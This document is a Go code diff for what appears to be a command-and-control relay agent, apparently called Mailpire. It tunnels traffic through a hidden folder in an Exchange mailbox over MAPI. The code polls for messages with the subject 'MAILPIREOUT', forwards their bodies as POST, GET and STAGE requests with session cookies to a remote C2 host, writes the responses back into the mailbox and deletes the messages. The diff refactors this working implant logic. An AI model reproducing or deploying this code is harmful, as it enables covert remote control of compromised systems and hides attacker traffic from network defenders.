@@ -44,16 +44,8 @@ func toBytes(input string) []byte {
 	return k
 }
 
-func encodeToHex(input []byte) string {
-	str := ""
-	for k, v := range input {
-		str += hex.EncodeToString([]byte{v})
-		if k < len(input)-1 {
-			str += "-"
-		}
-	}
-	str = base64.StdEncoding.EncodeToString([]byte(input))
-	return str
+func encodeToB64(input []byte) string {
+	return base64.StdEncoding.EncodeToString([]byte(input))
 }
 func fromUnicode(uni []byte) string {
 	st := ""
@@ -168,7 +160,7 @@ func sendMessage(agent *Agent, rpc string) {
 	x, er := mapi.CreateMessage(folderid, propertyTagx)
 
 	if er != nil {
-		//exit(er)
+		return
 	}
 	//because I don't know..
 	rpc = string(append([]byte{0x41, 0x41}, []byte(rpc)...))
@@ -181,7 +173,7 @@ func sendMessage(agent *Agent, rpc string) {
 }
 
 func getMessage(agent *Agent) string {
-	mapi.AuthSession = &agent.MapiSession
+	//mapi.AuthSession = &agent.MapiSession
 	folderid := agent.FolderID
 	rpc := ""
 	stop := false
@@ -203,32 +195,27 @@ func getMessage(agent *Agent) string {
 				continue
 			}
 			for k := 0; k < len(rows.RowData); k++ {
-				x := fromUnicode(rows.RowData[k][0].ValueArray)
+				messageSubject := fromUnicode(rows.RowData[k][0].ValueArray)
 				messageid := rows.RowData[k][1].ValueArray
 
-				if strings.ToUpper(x) == "MAILPIREOUT" {
+				if strings.ToUpper(messageSubject) == "MAILPIREOUT" {
 					//fetch full message
-					cols := make([]mapi.PropertyTag, 1)
+					columns := make([]mapi.PropertyTag, 1)
+					columns[0] = mapi.PidTagBody //Column for the Message Body containing our payload
 
-					cols[0] = mapi.PidTagBody //Html
-
-					buff, err := mapi.GetMessageFast(folderid, messageid, cols)
+					buff, err := mapi.GetMessageFast(folderid, messageid, columns)
 					if err != nil {
 						fmt.Println(err)
+						continue
 					}
 					//convert buffer to rows
-					messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, cols)
+					messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, columns)
 
 					stop = false
 					payload := fromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])
 
 					if payload == "" {
 						continue
-					}
-					//we also need to mark the message for deletion
-					_, err = mapi.DeleteMessages(folderid, 1, messageid)
-					if err != nil {
-						fmt.Println(err)
 					}
 
 					client := &http.Client{}
@@ -237,12 +224,10 @@ func getMessage(agent *Agent) string {
 
 					if strings.ToUpper(string(payload[0:5])) == "POST " {
 						pp := toBytes(payload[7:])
-						fmt.Println("POST: ")
 						req, _ = http.NewRequest("POST", fmt.Sprintf("%s/index.jsp", agent.Host), bytes.NewBuffer(pp))
 						req.Header.Add("Content-Type", "application/binary")
 						req.Header.Add("User-Agent", agent.UserAgent)
 					} else if strings.ToUpper(string(payload[0:3])) == "GET" {
-						fmt.Println("GET")
 						pi := strings.Split(payload, "-")
 						uri := pi[2]
 						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
@@ -252,7 +237,6 @@ func getMessage(agent *Agent) string {
 						req.AddCookie(c)
 					} else if strings.ToUpper(string(payload[0:5])) == "POSTM" {
 						pi := strings.Split(payload, "-")
-						fmt.Println("POSTM: ")
 						uri := pi[1]
 						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
 						lenn := len(pi[0]) + len(pi[1]) + 3
@@ -263,7 +247,6 @@ func getMessage(agent *Agent) string {
 						req.AddCookie(c)
 					} else if strings.ToUpper(string(payload[0:5])) == "STAGE" {
 						pi := strings.Split(payload, "-")
-						fmt.Println("STAGE: ")
 						uri := pi[1]
 						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
 						req, _ = http.NewRequest("GET", fmt.Sprintf("%s/%s", agent.Host, uri), nil)
@@ -276,14 +259,20 @@ func getMessage(agent *Agent) string {
 						defer resp.Body.Close()
 					}
 					if err != nil {
-						return ""
+						continue
 					}
 					body, err := ioutil.ReadAll(resp.Body)
 					if err != nil {
-						return ""
+						continue
 					}
-					//stop = true
-					rpc = encodeToHex(body)
+					rpc = encodeToB64(body)
+
+					//we also need to mark the message for deletion
+					_, err = mapi.DeleteMessages(folderid, 1, messageid)
+					if err != nil {
+						fmt.Println(err)
+						continue
+					}
 					return rpc
 				} else if rows.RowCount == 1 {
 					time.Sleep(time.Second * (time.Duration)(5))
@@ -337,7 +326,6 @@ func setupSession(email, username, password string) Agent {
 
 func runAgent(agent Agent) {
 
-	mapi.AuthSession = &agent.MapiSession
 	logon, err := mapi.Authenticate()
 
 	if err != nil {
@@ -350,7 +338,6 @@ func runAgent(agent Agent) {
 		rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
 
 		if er != nil {
-			//fmt.Println("[*] No Subfolders, so create our hidden folder")
 
 			mapi.GetFolder(mapi.INBOX, propertyTags)
 			r, err := mapi.CreateFolder(mailpire.FolderName, true)
@@ -367,7 +354,6 @@ func runAgent(agent Agent) {
 			}
 			if len(agent.FolderID) == 0 {
 				//fmt.Println("[*] Can't find our folder, so create our hidden folder")
-				mapi.AuthSession = &agent.MapiSession
 				mapi.GetFolder(mapi.INBOX, propertyTags)
 				_, err := mapi.CreateFolder(mailpire.FolderName, true)
 				if err != nil {
